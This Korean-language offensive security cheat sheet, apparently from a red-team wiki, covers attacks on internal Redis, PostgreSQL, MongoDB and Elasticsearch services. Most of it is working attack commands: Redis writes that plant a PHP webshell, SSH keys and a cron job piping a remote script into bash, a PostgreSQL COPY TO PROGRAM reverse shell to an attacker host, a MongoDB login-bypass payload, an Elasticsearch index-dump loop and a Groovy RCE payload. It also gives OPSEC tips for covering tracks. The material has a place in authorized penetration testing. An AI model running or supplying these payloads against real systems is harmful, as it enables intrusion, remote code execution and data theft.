# 데이터베이스 / 인메모리 서비스

!!! abstract "개요"
    내부망 정찰 시 빈번히 노출되는 **Redis(6379), PostgreSQL(5432), MongoDB(27017), Elasticsearch(9200)** 의 기본 공격 벡터.

---

## Redis (6379)

```bash
# 비인증 접근 확인 (내부망에서 가장 흔함)
redis-cli -h <target> ping
redis-cli -h <target> info
redis-cli -h <target> config get dir
redis-cli -h <target> keys '*'

# RCE 1: webshell을 DocumentRoot에 쓰기
redis-cli -h <target> config set dir /var/www/html/
redis-cli -h <target> config set dbfilename shell.php
redis-cli -h <target> set x '<?php system($_GET["c"]); ?>'
redis-cli -h <target> save

# RCE 2: authorized_keys 작성 (OpenSSH)
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > key.txt
redis-cli -h <target> -x set ssh_key < key.txt
redis-cli -h <target> config set dir /root/.ssh/
redis-cli -h <target> config set dbfilename authorized_keys
redis-cli -h <target> save

# RCE 3: cron (Debian 계열)
redis-cli -h <target> set x '\n\n* * * * * root curl -s http://atk/s|bash\n\n'
redis-cli -h <target> config set dir /etc/cron.d/
redis-cli -h <target> config set dbfilename pwn
redis-cli -h <target> save

# RCE 4: Module Load (Redis 4.x+) - RedisModules-ExecuteCommand
redis-cli -h <target> module load /tmp/exp.so
redis-cli -h <target> system.exec "id"
```

!!! tip "OPSEC"
    `SAVE` 는 RDB를 디스크에 쓰므로 원복 필요. `CONFIG RESETSTAT` / 원본 `dir`, `dbfilename` 복구 필수.

---

## PostgreSQL (5432)

```bash
# 접근 확인
psql -h <target> -U postgres -d postgres

# 버전 및 슈퍼유저 확인
SELECT version();
SELECT rolname, rolsuper FROM pg_roles;

# 파일 읽기 (슈퍼유저 권한)
CREATE TABLE r(t TEXT);
COPY r FROM '/etc/passwd';
SELECT * FROM r;

# RCE (9.3 이상, COPY ... FROM PROGRAM)
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATK/4444 0>&1"';

# RCE (Large Objects)
DROP TABLE IF EXISTS exp;
CREATE TABLE exp(data bytea);
INSERT INTO exp VALUES(...);  -- msfvenom 생성 ELF payload

# 9.4+: CVE-2019-9193 (PROGRAM 문법 이미 디폴트 허용)
# 10+: dblink / postgres_fdw 로 SSRF/내부 DB pivot
SELECT dblink_connect('host=inner_db user=admin password=xxx dbname=secret');
```

---

## MongoDB (27017)

```bash
# 비인증 접근 체크
mongo --host <target>
> show dbs
> use admin
> db.system.users.find()

# NoSQLMap 자동화
python3 nosqlmap.py

# BSON injection (웹앱 연계)
# Login bypass: 
POST /login
{"user": "admin", "pass": {"$ne": null}}
```

- MongoDB 3.0 이전: 기본 인증 없음. 3.0~3.6: 바인딩 주소가 `0.0.0.0` 기본값. 4.x+: 기본 localhost만 바인드.

---

## Elasticsearch (9200)

```bash
# 클러스터 정보 / 비인증 확인
curl -s http://<target>:9200/
curl -s http://<target>:9200/_cluster/health
curl -s http://<target>:9200/_cat/indices?v
curl -s "http://<target>:9200/_search?pretty&size=100"

# 민감 인덱스 전수 덤프
for idx in $(curl -s http://<target>:9200/_cat/indices | awk '{print $3}'); do
    curl -s "http://<target>:9200/$idx/_search?size=10000" > "dump_$idx.json"
done

# RCE (Groovy 스크립트 CVE-2015-1427, 구버전)
curl -XPOST http://<target>:9200/_search -d '
{"size":1,"script_fields":{"pwn":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}'
```

---

## MSSQL / MySQL / Oracle

이미 별도 문서 존재:

- [MSSQL](mssql.md)
- [MySQL](mysql.md)

Oracle TNS(1521) / SAPRouter(3299) 등 레거시 DB는 HackTricks 의 포트별 페이지 참조.

---

## 내부망 DB 탐지 Quickwin

```bash
# nmap 서비스 스캔 (DB 포트 집중)
nmap -Pn -n -sS -p 1433,1521,3306,3050,5000,5432,5984,6379,7199,8080,8529,9042,9200,11211,27017,28015,29015,50000 <subnet> --open

# nxc 모듈 (authenticated Windows 호스트에서 DB enum)
nxc mssql <targets> -u user -p pass --sa-check
nxc mssql <targets> -u user -p pass -q "SELECT @@version"
```

---

## 참고

- 공격 후 DB 덤프 처리: [Data Exfiltration](../lifecycle/exfiltration.md)
- 웹앱 SQLi: [Web - SQL Injection](../web/index.md#sql-injection)
